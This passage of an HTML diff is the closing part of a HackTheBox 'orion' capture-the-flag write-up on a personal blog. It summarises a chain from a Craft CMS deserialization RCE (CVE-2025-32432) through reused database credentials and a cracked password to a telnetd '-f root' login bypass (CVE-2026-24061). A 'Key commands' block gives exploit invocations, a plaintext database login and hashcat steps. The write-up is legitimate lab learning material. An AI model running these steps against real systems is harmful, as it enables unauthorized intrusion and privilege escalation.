+    <li><strong>paramiko over the interactive <code>ssh</code> CLI.</strong> Once creds for <code>adam</code> were in hand, a thin <code>ssh_run.py</code> wrapper (paramiko, one <code>exec_command</code> per call) made every follow-up command a single scriptable call instead of a pexpect-style interactive session.</li>
+    <li><strong>Telnet needs its own socket client, not a CLI wrapper.</strong> macOS's <code>telnet</code> (brew, netkit-derived) run through a non-PTY SSH channel never completes protocol negotiation — the <code>-l</code> flag's ENVIRON handshake gets lost. A PoC that does the IAC/ENVIRON negotiation itself over a raw <code>socket</code> sidesteps the whole TTY problem, which is why the working exploit is a from-scratch protocol client rather than a scripted invocation of the system <code>telnet</code> binary.</li>
+  </ul>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><td>→ www-data</td><td>Craft CMS 5.6.16 pre-auth deserialization RCE via a Yii2 <code>PhpManager</code> gadget chain in the asset-transform pipeline (CVE-2025-32432 / CWE-502); a plaintext <code>.env</code> sat inside the web root with live database credentials</td></tr>
+    <tr><td>→ adam</td><td>DB creds from <code>.env</code> reused to read the <code>users</code> table; the admin's bcrypt password was a dictionary word crackable from rockyou in seconds (CWE-521)</td></tr>
+    <tr><td>→ root</td><td>GNU Inetutils telnetd (1.9.3–2.7) trusts the telnet client's <code>ENVIRON</code>-negotiated <code>USER</code> value and passes it unsanitized to <code>login</code>, so <code>USER=-f root</code> becomes <code>login -f root</code> — a passwordless root session (CVE-2026-24061 / CWE-287, CWE-88)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. recon → Craft CMS 5.6.16</span>
+<span class="pc">nmap -sC -sV -Pn &lt;TARGET&gt;</span>
+<span class="pc">curl -s http://orion.htb/admin/login | grep -oE 'Craft [0-9.]+'</span>
+
+<span class="pco"># 2. CVE-2025-32432 → www-data (session-file variant, not access-log)</span>
+<span class="pc">python3 c0_exploit.py -u http://orion.htb -c 'id'                         # c0gnit00/CVE-2025-32432</span>
+<span class="pc">python3 c0_exploit.py -u http://orion.htb -c 'cat /var/www/html/craft/.env'</span>
+
+<span class="pco"># 3. DB creds → crack adam's hash → user.txt</span>
+<span class="pc">mysql -h127.0.0.1 -uroot -pSuperSecureCraft123Pass! orion -N -e "SELECT username,email,password FROM users;"</span>
+<span class="pc">hashcat -m 3200 adam.hash rockyou.txt --quiet -o adam.cracked --potfile-disable</span>
+<span class="pc">ssh adam@orion.htb                                                          # darkangel</span>
+
+<span class="pco"># 4. CVE-2026-24061 telnet USER-variable bypass → root.txt</span>
+<span class="pc">ss -lntp | grep 127.0.0.1:23                                                # telnetd, loopback only</span>
+<span class="pc">python3 cve_2026_24061.py 127.0.0.1 23                                     # Ish3ng0m4/CVE-2026-24061-Telnetd</span>
+<span class="pc">cat /root/root.txt</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
